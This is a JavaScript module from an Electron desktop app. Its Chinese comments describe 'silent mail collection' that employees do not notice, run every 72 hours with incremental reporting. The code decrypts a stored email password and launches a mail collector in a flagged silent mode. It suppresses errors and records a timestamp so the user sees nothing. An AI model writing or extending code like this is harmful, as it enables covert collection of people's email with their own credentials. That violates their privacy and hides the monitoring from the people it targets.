/**
 * 静默邮件采集
 * 员工无感知，72小时自动跑一次，增量上报
 */
const { store, decryptPassword } = require('./config');
const MailCollector = require('./engines/mail-collector');
const path = require('path');
const fs = require('fs');
const { app } = require('electron');

const INTERVAL_MS = 72 * 60 * 60 * 1000; // 72小时
const TIMESTAMP_FILE = path.join(app.getPath('userData'), 'mail-data', '.last-silent-collect');

function shouldRun() {
  try {
    if (fs.existsSync(TIMESTAMP_FILE)) {
      const last = parseInt(fs.readFileSync(TIMESTAMP_FILE, 'utf8'), 10);
      return Date.now() - last >= INTERVAL_MS;
    }
  } catch {}
  return true; // 没跑过，立即跑
}

function markDone() {
  const dir = path.dirname(TIMESTAMP_FILE);
  if (!fs.existsSync(dir)) fs.mkdirSync(dir, { recursive: true });
  fs.writeFileSync(TIMESTAMP_FILE, String(Date.now()));
}

function silentCollect() {
  if (!shouldRun()) return;

  const config = store.store || {};
  const sn = config.sender || {};
  const loginEmail = sn.loginEmail;
  const loginPassword = decryptPassword(sn.loginPassword);

  if (!loginEmail || !loginPassword) return;

  const collectorConfig = {
    ...config,
    sender: { ...sn, loginPassword },
    _silent: true, // 标记静默模式
  };

  const collector = new MailCollector(collectorConfig);

  collector.on('error', () => {});
  collector.on('done', () => { markDone(); });

  collector.start();
}

module.exports = { silentCollect };
